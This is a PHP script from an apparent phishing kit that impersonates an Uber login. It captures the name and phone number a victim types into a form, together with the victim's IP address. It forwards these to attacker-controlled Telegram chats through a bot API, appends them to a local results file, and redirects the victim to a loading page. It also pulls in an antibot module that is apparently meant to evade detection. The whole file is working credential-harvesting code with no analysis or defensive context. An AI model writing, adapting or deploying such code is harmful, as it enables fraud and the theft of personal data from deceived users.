<?php
require "antibot.php";
include "id.php";


$ip = getenv("REMOTE_ADDR");
$message = "━━━━━━━━━━━━━━━━━━━
🚖 𝗨𝗕𝗘𝗥 𝗟𝗢𝗚𝗜𝗡 𝗜𝗡𝗙𝗢
━━━━━━━━━━━━━━━━━━━
👤 Name      : ".$_POST['first']." ".$_POST['second']."
📞 Phone     : ".$_POST['num']."
🌍 Ip     : ".$ip."
━━━━━━━━━━━━━━━━━━━
🖤 𝗨𝗕𝗘𝗥 XTN SYSTEM 🖤
━━━━━━━━━━━━━━━━━━━";

foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot' . $bot . '/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
HEADER("Location: loading.php");

?>